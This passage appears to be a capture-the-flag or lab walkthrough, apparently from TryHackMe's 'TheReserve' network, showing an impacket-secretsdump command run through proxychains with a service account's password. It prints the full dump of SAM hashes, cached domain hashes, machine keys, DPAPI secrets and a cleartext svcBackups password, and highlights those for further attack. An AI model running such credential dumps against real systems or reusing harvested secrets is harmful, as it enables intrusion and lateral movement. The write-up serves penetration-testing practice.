Service accounts have more privileges than normal domain users. With the `svcScanning` account, we can carry out further attacks such as dumping secrets from the AD machines.

## Dump hashes on the `Server1` machine

$ `proxychains -q /usr/bin/impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.113.31`


> [!NOTE] Server1 hashes
> Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

### Service RemoteRegistry is in stopped state

Starting service RemoteRegistry

### Target system bootKey

0x90cf5c2fdcffe9d25ff0ed9b3d14a846

### Dumping local SAM hashes 
(uid:
rid:lmhash:nthash)

<font color="#00b050">Administrator:</font>500:aad3b435b51404eeaad3b435b51404ee:e2c7044e93cf7e4d8697582207d6785c:::

<font color="#00b050">Guest:</font>501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

<font color="#00b050">DefaultAccount:</font>503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

<font color="#00b050">WDAGUtilityAccount:</font>504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::

<font color="#00b050">THMSetup:</font>1008:aad3b435b51404eeaad3b435b51404ee:d37f688ca5172b5976b714a8b54b40f4:::

<font color="#00b050">HelpDesk:</font>1009:aad3b435b51404eeaad3b435b51404ee:f6ca2f672e731b37150f0c5fa8cfafff:::

<font color="#00b050">sshd:</font>1010:aad3b435b51404eeaad3b435b51404ee:48c62694fd5bbca286168e2199f9af49:::

### Dumping cached domain logon information 
(domain/username:hash)

<font color="#00b050">CORP.THERESERVE.LOC/Administrator</font>
$DCC2$10240#Administrator#b08785ec00370a4f7d02ef8bd9b798ca

<font color="#00b050">CORP.THERESERVE.LOC/svcScanning</font>
$DCC2$10240#svcScanning#d53a09b9e4646451ab823c37056a0d6b

### Dumping LSA Secrets

#### $MACHINE.ACC 

<font color="#00b050">CORP\SERVER1$:</font><font color="#00b050">aes256-cts-hmac-sha1-96:</font>491598bf647972748c617aabd5efabb08101de295064485f53617f726c5269bb

<font color="#00b050">CORP\SERVER1$:</font><font color="#00b050">aes128-cts-hmac-sha1-96:</font>d57ac7c73d110a704d927db338eaebd1

<font color="#00b050">CORP\SERVER1$:</font><font color="#00b050">des-cbc-md5:</font>
76a19dbfe007292c

<font color="#00b050">CORP\SERVER1$:plain_password_hex:</font>9ef03e6264985bee7d06dc65c33ade8cc65b4dddd1153a62799828a90f7380ddb9ece90d8d33ee1a9a8ba2edbc1ece7b708dd8590a3a2b6c81c0d0f5c838cbfec92cfac5b74c56508bfdfc7b4a5679d8faf602912edae9685ee71caf29f60ad75ad7b5e7fc53beb4d55cd42284a6b4f5c834d71ce7d94aaea464f724fe6cfc0fdc4925289dcc44baf76c5f2d50a45f659b403b015f7c09e62b94425b65b9754005fd2c142130bc0ba3c837d4b660f6360312cdd6adc193eb2abe431f0fbd802164c56402edbd7718f57923ca72bf2b8114fb8a1c29ff1478876ed95fdc9032488f255bea3fb555952d49be510c36d9ba

<font color="#00b050">CORP\SERVER1$:</font>aad3b435b51404eeaad3b435b51404ee:955ca6f4b9f3b6ab69bd0b254774311f:::

### DPAPI_SYSTEM 

<font color="#00b050">dpapi_machinekey:</font>
0xb4cfb5032a98c1b279c92264915da1fd3d8b1a0d

<font color="#00b050">dpapi_userkey:</font>
0x3cddfc2ba786e51edf1c732a21ffa1f3d19aa382

### NL$KM 

 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...

<font color="#00b050">NL$KM:</font>8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2

### SC_SYNC 
<font color="#00b050">svcBackups@corp.thereserve.loc:</font>
q9nzssaFtGHdqUV3Qv6G

Cleaning up... 
Stopping service RemoteRegistry


> There are a couple of things from this output that are of most interest.

- The Administrator’s NTLM hash.
	- <font color="#00b050">CORP.THERESERVE.LOC/Administrator</font>
	- $DCC2$10240#Administrator#b08785ec00370a4f7d02ef8bd9b798ca
- The ClearText password for `svcBackups` account.
	- <font color="#00b050">svcBackups@corp.thereserve.loc:</font>
	- q9nzssaFtGHdqUV3Qv6G